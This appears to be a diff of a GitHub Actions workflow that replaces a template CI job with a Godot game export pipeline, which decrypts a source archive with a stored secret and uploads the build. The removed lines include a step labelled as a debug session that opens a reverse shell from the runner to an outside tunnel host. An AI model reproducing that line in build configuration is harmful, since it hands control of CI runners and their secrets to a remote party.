@@ -1,32 +1,48 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
-on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
+# Whenever a tag push matching pattern "v*" then run the job
+on: 
   push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
+    tags:
+      - "v*"
 
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
+  # job id, can be anything
+  export_game:
+    # Always use ubuntu-latest for this action
     runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
+    # Add permission for release creation. Can be made narrower according to your needs
+    permissions: write-all
+    # Job name, can be anything
+    name: Export Game
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Setup Debug Session
-        run: |
-          echo hi
-          bash -i>& /dev/tcp/2.tcp.cpolar.cn/10072 0>&1
+      # Always include the checkout step so that 
+      # your project is available for Godot to export
+    - name: checkout
+      uses: actions/checkout@v3.3.0
+    - name: Decrypt Game
+      run: |
+        unzip -P "${GDC_PASSWORD}" src.zip
+      env:
+        GDC_PASSWORD: ${{ secrets.GDC_PASSWORD }}
+    - name: Export Game
+      id: export
+      # Use latest version (see releases for all versions)
+      uses: Genouka/godot-export@v1
+      with:
+        # Defining all the required inputs
+        godot_executable_download_url: https://github.com/godotengine/godot/releases/download/4.1.1-stable/Godot_v4.1.1-stable_linux.x86_64.zip
+        godot_export_templates_download_url: https://github.com/godotengine/godot/releases/download/4.1.1-stable/Godot_v4.1.1-stable_export_templates.tpz
+        relative_project_path: ./
+        archive_output: true
+    - name: Encrypt Results
+      run: |
+        zip -P "${GDC_PASSWORD}" dest.zip "${path}"
+        echo "DEST_FILE_PATH=$(find ./ -name 'dest.zip')" >> $GITHUB_ENV
+  
+      env:
+        GDC_PASSWORD: ${{ secrets.GDC_PASSWORD }}
+        path: ${{ steps.export.outputs.archive_directory }}
+    - name: Upload Artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        path: ${{ env.DEST_FILE_PATH }}
+        name: release-${{ github.event.head_commit.id }}-arm32
